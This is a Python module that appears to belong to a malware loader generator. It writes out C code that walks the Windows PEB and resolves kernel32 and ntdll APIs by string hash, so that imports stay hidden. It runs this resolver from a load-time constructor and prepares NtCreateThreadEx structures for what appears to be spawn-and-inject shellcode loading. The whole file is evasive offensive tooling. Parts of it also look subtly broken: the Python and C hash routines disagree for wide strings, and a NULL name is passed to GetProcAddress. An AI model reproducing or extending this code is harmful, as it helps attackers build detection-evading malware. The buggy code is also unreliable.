import random
import string
from c.utils.typedefs import typedefs

class pebwalkhash:
    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        self.handle = 'LoadLibrary'
        if 'handle' in arguments:
            if arguments['handle'] in ['LoadLibrary', 'GetModuleHandleA']:
                self.handle = arguments['handle']
            else:
                print("Handle must be either LoadLibrary or GetModuleHandleA")
                exit(0)
        self.typedefs = typedefs

    def imports(self) -> list[str]:
        return ['#include <windows.h>',
                '#include "spawnandinject.h"']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        kernel32 = []
        ntdll = []
        codeblock = ''
        for apicall in self.apicalls:
            if apicall[0:2] in ['Nt', 'Zw', 'Rt']:
                ntdll.append(apicall)
            else:
                kernel32.append(apicall)

        codeblock += """

UINT_PTR HashString( LPVOID String, BOOLEAN IsWide )
{
    ULONG Hash = 5381;
    PUCHAR Ptr = String;

    do
    {
        UCHAR character = *Ptr;
        if ( !*Ptr && !IsWide )
            break;

        if ( character >= 'a' )
            character -= 0x20;

        Hash = ( ( Hash << 5 ) + Hash ) + character; 
        if ( IsWide && ( !*Ptr && !*++Ptr ) )
            break;

        ++Ptr;
    } while ( TRUE );
    return Hash;
} 

PVOID LoadModulePeb( UINT_PTR hModuleHash )
{

    MY_PPEB PPEB_PTR = (MY_PPEB)__readgsqword( 0x60 );
    PLIST_ENTRY Module      = ( ( MY_PPEB ) PPEB_PTR )->Ldr->InLoadOrderModuleList.Flink; 
    PLIST_ENTRY FirstModule = Module;

    WCHAR  SearchModuleLower[ MAX_PATH ]  = { 0 };
    WCHAR  PebModuleLower   [ MAX_PATH ]  = { 0 };

    do
    {
        // Zero a buffer and lowercase the found module name
        PMY_LDR_DATA_TABLE_ENTRY mod = (PMY_LDR_DATA_TABLE_ENTRY)CONTAINING_RECORD(
            Module, MY_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks
        );
        DWORD ModuleHash = HashString(mod->BaseDllName.Buffer, TRUE);

        // If the lowercased strings match, return the address of the DLL
        if ( ModuleHash == hModuleHash ){
            return mod->DllBase;
        }
        Module = Module->Flink;
    } while ( Module && Module != FirstModule );

    return 0;
}


PVOID LoadFunction( PBYTE Module, UINT_PTR FunctionHash )
{
    PIMAGE_NT_HEADERS       NtHeader         = NULL;
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = NULL;
    PDWORD                  AddrOfFunctions  = NULL;
    PDWORD                  AddrOfNames      = NULL;
    PWORD                   AddrOfOrdinals   = NULL;
    PVOID                   FunctionAddr     = NULL;
    LPSTR                   FoundName        = NULL;
    PCHAR FunctionName = NULL;

    NtHeader         = (PIMAGE_NT_HEADERS)(Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew);
    ExpDirectory     = (PIMAGE_EXPORT_DIRECTORY)(Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress);
    
    // Resolve absolute address of important export directory members
    AddrOfNames      = (PDWORD)(Module + ExpDirectory->AddressOfNames);
    AddrOfFunctions  = (PDWORD)(Module + ExpDirectory->AddressOfFunctions);
    AddrOfOrdinals   = (PWORD)(Module + ExpDirectory->AddressOfNameOrdinals);

    // Walk through the number of names
    for ( DWORD I = 0; I < ExpDirectory->NumberOfNames; I++ )
    {
        // Zero a buffer to contain the found function, lowercased
        FunctionName = ( PCHAR ) Module + AddrOfNames[ I ];

        // Check if the lowercased strings match
        if ( HashString( FunctionName, FALSE ) == FunctionHash )
        {
            // If they match, resolve the address of the function's code
            FunctionAddr = Module + AddrOfFunctions[ AddrOfOrdinals[ I ] ];

            if ( 
                (void *)FunctionAddr > (void *)(Module + NtHeader->OptionalHeader.DataDirectory[ 0 ].VirtualAddress) && 
                (void *)FunctionAddr < (void *)(Module + NtHeader->OptionalHeader.DataDirectory[ 0 ].VirtualAddress + NtHeader->OptionalHeader.DataDirectory[ 0 ].Size)
            ) // Forwarders are inside export table
            {
                // We can use getProcAddr to resolve forwarders
                // Manually is difficult -- we may run into apisets rather than simple [module].[export] strings
                return GetProcAddress( (HMODULE)Module, FoundName );
            }
            return FunctionAddr;
        }
    }
    return NULL;
}
"""


        if 'NtCreateThreadEx' in ntdll:
            codeblock += """
typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;
        

_Struct_size_bytes_(TotalLength)
typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
"""

        codeblock += f"""

{'\n'.join([value for key,value in self.typedefs.items() if key in self.apicalls ])}

typedef struct {{
    {'\n\t'.join([f'{x}_t {x}_resolved;' for x in self.apicalls ])}
}} Resolver;

Resolver resolver;

void {self.name}(void) __attribute__((constructor));

void {self.name}(){{
"""
        if len(kernel32) > 0:
            codeblock += f"""
    PVOID kernelHandle = LoadModulePeb({self.hash_string('kernel32.dll')});
    {'\n\t'.join([f'resolver.{x}_resolved = ({x}_t)LoadFunction(kernelHandle, {self.hash_string(x, False)});' for x in kernel32])};
"""

        if len(ntdll) > 0:
            codeblock += f"""
    PVOID ntdllHandle = LoadModulePeb({self.hash_string('ntdll.dll')});
    {'\n\t'.join([f'resolver.{x}_resolved = ({x}_t)LoadFunction(ntdllHandle, {self.hash_string(x, False)});' for x in ntdll])};
"""

        codeblock += f"""
}}
"""
        return codeblock

    def resolve(self, apicalls):
        resolved = {}
        self.apicalls = apicalls
        for apicall in apicalls:
            resolved[apicall] = f'resolver.{apicall}_resolved'
        return resolved

    def hash_string(self, functionName, isWide=True ):
        # The hash value (5381 in this case) has to be the same for the Python script and the C code
        hash = 5381
        # Convert the input string to uppercase for case insensitivity
        functionName = functionName.upper()

        for x in range(0, len(functionName), 1):
            # If isWide is False or it's the first character
            if x == 0 or not isWide:
                # Incorporate the ordinal value of the character into hash calculation
                hash = (( hash << 5 ) + hash ) + ord(functionName[x])

            if isWide:
                # Only perform hash calculation without including ordinal value of character
                hash = (( hash << 5 ) + hash )

                # Check if it's the end of the string for wide strings
                if x == len(functionName):
                    hash = (( hash << 5 ) + hash )

        return hash & 0xFFFFFFFF 